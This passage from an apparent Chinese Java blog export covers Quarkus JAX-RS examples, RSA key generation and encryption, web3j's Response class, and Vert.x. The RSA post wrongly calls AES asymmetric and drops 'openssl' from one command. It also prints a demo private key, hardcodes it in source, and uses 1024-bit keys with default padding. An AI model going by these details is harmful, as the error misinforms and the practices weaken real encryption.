<p>示例代码1：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Path</span>(<span class="string">"/hello"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GreetingsResource</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GET</span></span><br><span class="line">    <span class="meta">@Produces</span>(MediaType.TEXT_PLAIN)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello RESTEasy"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>示例代码2：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.ws.rs.Consumes;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.DELETE;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.GET;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.POST;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.Path;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.PathParam;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.Produces;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.QueryParam;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.core.MediaType;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.core.Response;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.core.UriBuilder;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Path</span>(<span class="string">"/book"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BookResource</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@GET</span></span><br><span class="line">   <span class="meta">@Path</span>(<span class="string">"/&#123;bookId&#125;"</span>)</span><br><span class="line">   <span class="meta">@Produces</span>(MediaType.APPLICATION_JSON)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> Book <span class="title">book</span><span class="params">(@PathParam(<span class="string">"bookId"</span>)</span> Long bookId) </span>&#123;</span><br><span class="line">    <span class="comment">// logic</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@POST</span></span><br><span class="line">   <span class="meta">@Consumes</span>(MediaType.APPLICATION_JSON)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> Response <span class="title">getBook</span><span class="params">(Book book)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// logic</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> Response.created(</span><br><span class="line">                   UriBuilder.fromResource(BookResource<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">                     .<span class="title">path</span>(<span class="title">Long</span>.<span class="title">toString</span>(<span class="title">book</span>.<span class="title">bookId</span>))</span></span><br><span class="line"><span class="class">                     .<span class="title">build</span>())</span></span><br><span class="line"><span class="class">               .<span class="title">build</span>()</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@DELETE</span></span><br><span class="line">   <span class="meta">@Path</span>(<span class="string">"/&#123;bookId&#125;"</span>)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> Response <span class="title">delete</span><span class="params">(@PathParam(<span class="string">"bookId"</span>)</span> Long bookId) </span>&#123;</span><br><span class="line">       <span class="comment">// logic</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> Response.noContent().build();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@GET</span></span><br><span class="line">   <span class="meta">@Produces</span>(MediaType.APPLICATION_JSON)</span><br><span class="line">   <span class="meta">@Path</span>(<span class="string">"search"</span>)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> Response <span class="title">searchBook</span><span class="params">(@QueryParam(<span class="string">"description"</span>)</span> String description) </span>&#123;       </span><br><span class="line">       <span class="comment">// logic</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> Response.ok(books).build();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>入门可以参考此文：<a href="https://blog.csdn.net/w57685321/article/details/111995192" target="_blank" rel="noopener">【Quarkus云原生应用初体验】</a></p>
<p>如下图，类似 Quarkus 实现MicroProfile规范的框架有这么多：<br><img src="/images/java/MicroProfile规范的实现.png" alt></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>RSA加密解密实践</title>
    <url>/Java/RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<p>AES是非对称加密，有公钥/私钥。</p>
<h2 id="一、创建秘钥对"><a href="#一、创建秘钥对" class="headerlink" title="一、创建秘钥对"></a>一、创建秘钥对</h2><p>openssl和jdk都可以生成秘钥对，但要注意的是他们会有<strong>默认规范</strong>，这可能会导致在不同的平台上不通用。推荐在线生成。</p>
<h3 id="1-在线生成"><a href="#1-在线生成" class="headerlink" title="1. 在线生成"></a>1. 在线生成</h3><p><a href="http://www.metools.info/code/c80.html" target="_blank" rel="noopener">【在线生成公钥私钥对，RSA公私钥生成】</a> 可以在线生成。</p>
<p>RSA非对称加密公私钥对生成，输出PEM格式的公私钥对，同时支持PKCS#1、PKCS#8密钥格式输出；生成的公私钥对，可拷贝到文本文件，保存为.key文件即可使用。</p>
<p>PEM格式：RSA公私钥对常用的编码方式，OPENSSL以PEM格式为主，相对DER可读性更强，以BASE64编码呈现；<br>开头类似 —–BEGIN PRIVATE KEY—–<br>结尾类似 —–END PRIVATE KEY—–</p>
<p>PKCS#8密钥格式，多用于JAVA、PHP程序加解密中，为目前用的比较多的密钥、证书格式；<br>PKCS#1密钥格式，多用于JS等其它程序加解密，属于比较老的格式标准。<br>PKCS#1和PKCS#8的主要区别，从本质上说，PKCS#8格式增加验证数据段，保证密钥正确性。</p>
<h3 id="2-openssl生成"><a href="#2-openssl生成" class="headerlink" title="2. openssl生成"></a>2. openssl生成</h3><p>生成私钥，长度1024（一般会推荐2048）<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ openssl version</span><br><span class="line">OpenSSL 1.1.1f  31 Mar 2020</span><br><span class="line">$ openssl genrsa -out rsa_private_key.pem 1024</span><br><span class="line">Generating RSA private key, 1024 bit long modulus (2 primes)</span><br><span class="line">...............+++++</span><br><span class="line">...................................................+++++</span><br><span class="line">e is 65537 (0x010001)</span><br><span class="line">$ cat rsa_private_key.pem</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXgIBAAKBgQDMtvNrm4VDreYXzMRnJ4htiBPnnw9djDL5aLQUYm3w2TQ0CGD1</span><br><span class="line">KMBhsm7hC5sf4RkODQYq6Wp1mkL30GStfbaal1S9ILnt9w51P0IpOqAFNZ6jwAtr</span><br><span class="line">WUhUhrr+33vcJ8gQh4+fJcAEXvrWbNnTCj9zHFDMelo7bR2PsDLJ6jqqkwIDAQAB</span><br><span class="line">AoGBAKFO9AZx2JOY3rsYPhaufwEX/d9AZcIn7C69Q1DgspLbBBiQFZ54iwcwq9Am</span><br><span class="line">7ggzviNlPdvoa1vZvzU4f2x5p71FIGZn6rSb00TB4GxvXox1VOd9bcdj0iDrclDu</span><br><span class="line">O/Wt408Pct1TpYA2OwoxFvSgY5wxpZilxHiiRghypFK5sooZAkEA9Zh3Vfq12+fR</span><br><span class="line">8EDHHZKKtJug+jnuSdnoZIjhjB8Ki7Uor/+uQlxjoTW/PwYJKCoIFBhIcBA1h5tl</span><br><span class="line">zCQHPgCcBQJBANVjH3IYUGtC834DvIaZQCCa9oG38cbnSF5mqPrhV769hXXsc0XM</span><br><span class="line">I2/ZitKCFC0vg/D3lCE52vPi4w142tMbB7cCQQC/nCuG1iqqnivp8PAof1teW4l1</span><br><span class="line">kFr8HVm1jiHCi7lTlIxg++898Qz+CoviJNhiEKDq5KMnY04QNcpvQbCwzBLtAkEA</span><br><span class="line">kcAuzmPFKj6EymIK93Td1GeEUH4v6sg3KiO87//TSzlwW2eyJM6WteNFaxvmZCa8</span><br><span class="line">XG7/AuLdpxAmPiF6dg9UaQJAVP+oZrFdqBvutIBlLdg9ZmLXHwk4oqbLexcPI4mB</span><br><span class="line">+bc0Qeuv4vV1x6M/024Ae6SCC4ywnx9xNVTedn6siZfNNQ==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p>
<p>根据私钥生成公钥<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ openssl rsa -<span class="keyword">in</span> rsa_private_key.pem -out rsa_public_key.pem -pubout</span><br><span class="line">writing RSA key</span><br><span class="line"></span><br><span class="line">$ cat rsa_public_key.pem</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMtvNrm4VDreYXzMRnJ4htiBPn</span><br><span class="line">nw9djDL5aLQUYm3w2TQ0CGD1KMBhsm7hC5sf4RkODQYq6Wp1mkL30GStfbaal1S9</span><br><span class="line">ILnt9w51P0IpOqAFNZ6jwAtrWUhUhrr+33vcJ8gQh4+fJcAEXvrWbNnTCj9zHFDM</span><br><span class="line">elo7bR2PsDLJ6jqqkwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure></p>
<p>注意：此时的私钥还不能直接被使用，需要进行PKCS#8编码：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ pkcs8 -topk8 -<span class="keyword">in</span> rsa_private_key.pem -out pkcs8_rsa_private_key.pem -nocrypt</span><br><span class="line"></span><br><span class="line">$ cat pkcs8_rsa_private_key.pem</span><br><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBAMy282ubhUOt5hfM</span><br><span class="line">xGcniG2IE+efD12MMvlotBRibfDZNDQIYPUowGGybuELmx/hGQ4NBirpanWaQvfQ</span><br><span class="line">ZK19tpqXVL0gue33DnU/Qik6oAU1nqPAC2tZSFSGuv7fe9wnyBCHj58lwARe+tZs</span><br><span class="line">2dMKP3McUMx6WjttHY+wMsnqOqqTAgMBAAECgYEAoU70BnHYk5jeuxg+Fq5/ARf9</span><br><span class="line">30BlwifsLr1DUOCyktsEGJAVnniLBzCr0CbuCDO+I2U92+hrW9m/NTh/bHmnvUUg</span><br><span class="line">ZmfqtJvTRMHgbG9ejHVU531tx2PSIOtyUO479a3jTw9y3VOlgDY7CjEW9KBjnDGl</span><br><span class="line">mKXEeKJGCHKkUrmyihkCQQD1mHdV+rXb59HwQMcdkoq0m6D6Oe5J2ehkiOGMHwqL</span><br><span class="line">tSiv/65CXGOhNb8/BgkoKggUGEhwEDWHm2XMJAc+AJwFAkEA1WMfchhQa0LzfgO8</span><br><span class="line">hplAIJr2gbfxxudIXmao+uFXvr2FdexzRcwjb9mK0oIULS+D8PeUITna8+LjDXja</span><br><span class="line">0xsHtwJBAL+cK4bWKqqeK+nw8Ch/W15biXWQWvwdWbWOIcKLuVOUjGD77z3xDP4K</span><br><span class="line">i+Ik2GIQoOrkoydjThA1ym9BsLDMEu0CQQCRwC7OY8UqPoTKYgr3dN3UZ4RQfi/q</span><br><span class="line">yDcqI7zv/9NLOXBbZ7Ikzpa140VrG+ZkJrxcbv8C4t2nECY+IXp2D1RpAkBU/6hm</span><br><span class="line">sV2oG+60gGUt2D1mYtcfCTiipst7Fw8jiYH5tzRB66/i9XXHoz/TbgB7pIILjLCf</span><br><span class="line">H3E1VN52fqyJl801</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>参考<a href="https://www.cnblogs.com/yaowen/p/9226566.html" target="_blank" rel="noopener">【Java中使用OpenSSL生成的RSA公私钥进行数据加解密】</a></p>
<h3 id="3-Java代码生成"><a href="#3-Java代码生成" class="headerlink" title="3. Java代码生成"></a>3. Java代码生成</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance(<span class="string">"RSA"</span>);</span><br><span class="line">keyPairGen.initialize(<span class="number">1024</span>);</span><br><span class="line">KeyPair keyPair = keyPairGen.generateKeyPair();</span><br><span class="line"><span class="comment">//X509规范</span></span><br><span class="line">RSAPublicKey publicKey = (RSAPublicKey) keyPair.getPublic();</span><br><span class="line"><span class="comment">//PKCS#8规范</span></span><br><span class="line">RSAPrivateKey privateKey = (RSAPrivateKey) keyPair.getPrivate();</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">"-----BEGIN PUBLIC KEY-----"</span>);</span><br><span class="line">System.out.println(Base64.getEncoder().encodeToString(publicKey.getEncoded()));</span><br><span class="line">System.out.println(<span class="string">"-----END PUBLIC KEY-----"</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">"-----BEGIN PRIVATE KEY-----"</span>);</span><br><span class="line">System.out.println(Base64.getEncoder().encodeToString(privateKey.getEncoded()));</span><br><span class="line">System.out.println(<span class="string">"-----END PRIVATE KEY-----"</span>);</span><br></pre></td></tr></table></figure>
<h2 id="二、加密解密"><a href="#二、加密解密" class="headerlink" title="二、加密解密"></a>二、加密解密</h2><p>这里采用的是上面的 “【openssl生成】” 的秘钥对。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyFactory;</span><br><span class="line"><span class="keyword">import</span> java.security.PrivateKey;</span><br><span class="line"><span class="keyword">import</span> java.security.PublicKey;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.PKCS8EncodedKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.X509EncodedKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRsa4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String PRI_KEY = <span class="string">"MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBAMy282ubhUOt5hfMxGcniG2IE+efD12MMvlotBRibfDZNDQIYPUowGGybuELmx/hGQ4NBirpanWaQvfQZK19tpqXVL0gue33DnU/Qik6oAU1nqPAC2tZSFSGuv7fe9wnyBCHj58lwARe+tZs2dMKP3McUMx6WjttHY+wMsnqOqqTAgMBAAECgYEAoU70BnHYk5jeuxg+Fq5/ARf930BlwifsLr1DUOCyktsEGJAVnniLBzCr0CbuCDO+I2U92+hrW9m/NTh/bHmnvUUgZmfqtJvTRMHgbG9ejHVU531tx2PSIOtyUO479a3jTw9y3VOlgDY7CjEW9KBjnDGlmKXEeKJGCHKkUrmyihkCQQD1mHdV+rXb59HwQMcdkoq0m6D6Oe5J2ehkiOGMHwqLtSiv/65CXGOhNb8/BgkoKggUGEhwEDWHm2XMJAc+AJwFAkEA1WMfchhQa0LzfgO8hplAIJr2gbfxxudIXmao+uFXvr2FdexzRcwjb9mK0oIULS+D8PeUITna8+LjDXja0xsHtwJBAL+cK4bWKqqeK+nw8Ch/W15biXWQWvwdWbWOIcKLuVOUjGD77z3xDP4Ki+Ik2GIQoOrkoydjThA1ym9BsLDMEu0CQQCRwC7OY8UqPoTKYgr3dN3UZ4RQfi/qyDcqI7zv/9NLOXBbZ7Ikzpa140VrG+ZkJrxcbv8C4t2nECY+IXp2D1RpAkBU/6hmsV2oG+60gGUt2D1mYtcfCTiipst7Fw8jiYH5tzRB66/i9XXHoz/TbgB7pIILjLCfH3E1VN52fqyJl801"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String PUB_KEY =<span class="string">"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMtvNrm4VDreYXzMRnJ4htiBPnnw9djDL5aLQUYm3w2TQ0CGD1KMBhsm7hC5sf4RkODQYq6Wp1mkL30GStfbaal1S9ILnt9w51P0IpOqAFNZ6jwAtrWUhUhrr+33vcJ8gQh4+fJcAEXvrWbNnTCj9zHFDMelo7bR2PsDLJ6jqqkwIDAQAB"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String encr = encrypted(<span class="string">"1212121212"</span>, PUB_KEY);</span><br><span class="line">        String result = decrypt(encr, PRI_KEY);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypted</span> <span class="params">(String content,String pubkey)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//先还原公钥的密钥，再加密</span></span><br><span class="line">        KeyFactory keyFactory = KeyFactory.getInstance(<span class="string">"RSA"</span>);</span><br><span class="line">        X509EncodedKeySpec keySpec = <span class="keyword">new</span> X509EncodedKeySpec(Base64.getDecoder().decode(pubkey));</span><br><span class="line">        PublicKey publicKey = keyFactory.generatePublic(keySpec);</span><br><span class="line">        Cipher cipher = Cipher.getInstance(<span class="string">"RSA"</span>);</span><br><span class="line">        cipher.init(Cipher.ENCRYPT_MODE, publicKey);</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(cipher.doFinal(content.getBytes(StandardCharsets.UTF_8)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decrypt</span> <span class="params">(String cryptograph, String prikey)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//先还原私钥的密钥，再解密</span></span><br><span class="line">        PKCS8EncodedKeySpec keySpec = <span class="keyword">new</span> PKCS8EncodedKeySpec(Base64.getDecoder().decode(prikey));</span><br><span class="line">        PrivateKey privateKey = KeyFactory.getInstance(<span class="string">"RSA"</span>).generatePrivate(keySpec);</span><br><span class="line">        Cipher cipher = Cipher.getInstance(<span class="string">"RSA"</span>);</span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE, privateKey);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] b = Base64.getDecoder().decode(cryptograph);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(cipher.doFinal(b));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>参考web3j的响应类定义</title>
    <url>/Java/%E5%8F%82%E8%80%83web3j%E7%9A%84%E5%93%8D%E5%BA%94%E7%B1%BB%E5%AE%9A%E4%B9%89/</url>
    <content><![CDATA[<p>平时写Android App和Web服务器的通讯是通过JSON的数据格式，然而自己对响应数据的定义的一般是使用Java Bean的继承来实现，下面是web3j的设计，也差不多这样，但是他的泛型用的挺的，以后可以参考。</p>
<p>比如：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.web3j.protocol.core.methods.response;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.web3j.protocol.core.Response;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * eth_coinbase.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EthCoinbase</span> <span class="keyword">extends</span> <span class="title">Response</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getResult();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Response类的 <code>result</code> 字段使用了泛型 <code>T</code> :<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.web3j.protocol.core;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonIgnoreProperties;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Our common JSON-RPC response type.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &lt;T&gt; the object type contained within the response</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@JsonIgnoreProperties</span>(ignoreUnknown = <span class="keyword">true</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Response</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> id;</span><br><span class="line">    <span class="keyword">private</span> String jsonrpc;</span><br><span class="line">    <span class="keyword">private</span> T result;</span><br><span class="line">    <span class="keyword">private</span> Error error;</span><br><span class="line">    <span class="keyword">private</span> String rawResponse;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Response</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">long</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getJsonrpc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> jsonrpc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setJsonrpc</span><span class="params">(String jsonrpc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.jsonrpc = jsonrpc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">getResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setResult</span><span class="params">(T result)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.result = result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Error <span class="title">getError</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setError</span><span class="params">(Error error)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.error = error;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasError</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> error != <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getRawResponse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> rawResponse;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRawResponse</span><span class="params">(String rawResponse)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.rawResponse = rawResponse;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Error</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> code;</span><br><span class="line">        <span class="keyword">private</span> String message;</span><br><span class="line">        <span class="keyword">private</span> String data;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Error</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Error</span><span class="params">(<span class="keyword">int</span> code, String message)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.code = code;</span><br><span class="line">            <span class="keyword">this</span>.message = message;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> code;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCode</span><span class="params">(<span class="keyword">int</span> code)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.code = code;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> message;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMessage</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.message = message;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setData</span><span class="params">(String data)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.data = data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span> == o) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Error)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Error error = (Error) o;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (getCode() != error.getCode()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (getMessage() != <span class="keyword">null</span></span><br><span class="line">                    ? !getMessage().equals(error.getMessage()) : error.getMessage() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> getData() != <span class="keyword">null</span> ? getData().equals(error.getData()) : error.getData() == <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> result = getCode();</span><br><span class="line">            result = <span class="number">31</span> * result + (getMessage() != <span class="keyword">null</span> ? getMessage().hashCode() : <span class="number">0</span>);</span><br><span class="line">            result = <span class="number">31</span> * result + (getData() != <span class="keyword">null</span> ? getData().hashCode() : <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>Vert.X</title>
    <url>/Java/VertX/</url>
    <content><![CDATA[<p><a href="https://vertx.io/" target="_blank" rel="noopener">Vert.x</a>是一个基于 JVM、轻量级、高性能的应用平台，采用事件驱动的编程模型，底层使用的Netty作为通讯组件，为了降低使用门槛，屏蔽掉了许多底层netty相关的细节。</p>
<blockquote>
<p>官网介绍：Vert.x™ Reactive applications on the JVM</p>
</blockquote>
<h2 id="历史背景"><a href="#历史背景" class="headerlink" title="历史背景"></a>历史背景</h2><p>一位名叫 Tim Fox 的开发人员曾在 VMware 的 SpringSource 部门工作。在此期间，他领导开发了 Vert.x 项目。2012 年，Tim 跳槽到了 Red Hat 并希望能够继续从事该项目的开发，所以VMware和Redhat为此吵了一段时间，后来项目转移到Eclipse基金会。</p>
